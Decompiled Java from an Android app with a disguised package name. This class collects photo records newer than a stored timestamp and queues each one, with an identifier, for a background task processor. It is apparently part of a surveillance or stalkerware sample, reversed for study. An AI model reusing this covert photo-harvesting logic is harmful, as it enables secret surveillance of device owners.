package com.app.system.common.f;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.app.system.common.entity.PhotoLog;
import com.app.system.common.f.a.g;
import com.app.system.common.h.l;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class j
  extends a
{
  public static int a(Context paramContext, long paramLong)
  {
    try
    {
      SharedPreferences.Editor localEditor = paramContext.getSharedPreferences("pref", 0).edit();
      long l = paramLong;
      if (paramLong <= 0L)
      {
        localObject1 = new java/util/Date;
        ((Date)localObject1).<init>();
        l = ((Date)localObject1).getTime() / 1000L - 86400L;
      }
      Object localObject1 = new com/app/system/common/a/e;
      ((com.app.system.common.a.e)localObject1).<init>(paramContext);
      Object localObject2 = new java/util/Date;
      ((Date)localObject2).<init>((1L + l) * 1000L);
      Date localDate = new java/util/Date;
      localDate.<init>();
      localObject2 = ((com.app.system.common.a.e)localObject1).a(false, (Date)localObject2, localDate);
      if ((localObject2 != null) && (((List)localObject2).size() > 0))
      {
        localObject1 = new com/app/system/common/h/l;
        ((l)localObject1).<init>(paramContext);
        localObject2 = ((List)localObject2).iterator();
        for (paramLong = 0L; ((Iterator)localObject2).hasNext(); paramLong = paramContext.a().getTime() / 1000L)
        {
          label135:
          paramContext = (PhotoLog)((Iterator)localObject2).next();
          if ((paramContext == null) || (paramContext.a().getTime() / 1000L <= l)) {
            break label135;
          }
          ((l)localObject1).a(paramContext);
        }
        if (paramLong > 0L)
        {
          paramContext = new java/util/Date;
          paramContext.<init>();
          localEditor.putLong("last-photo-date", paramContext.getTime() / 1000L);
          localEditor.commit();
        }
      }
    }
    catch (Exception paramContext)
    {
      com.security.d.a.d("Photo", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
  
  public static void k(Context paramContext)
  {
    a(paramContext, paramContext.getSharedPreferences("pref", 0).getLong("last-photo-date", 0L));
    l locall = new l(paramContext);
    Object localObject = locall.a(null, null, 25);
    String str = com.app.system.common.h.c(paramContext);
    if ((localObject != null) && (((List)localObject).size() > 0))
    {
      Iterator localIterator = ((List)localObject).iterator();
      while (localIterator.hasNext())
      {
        localObject = new g(str, locall, (PhotoLog)localIterator.next());
        com.app.system.common.f.a.h.a().a((com.app.system.common.f.a.e)localObject);
      }
      com.app.system.common.f.a.h.a().a(paramContext);
    }
  }
}


/* Location:              ~/com/app/system/common/f/j.class
 *
 * Reversed by:           J
 */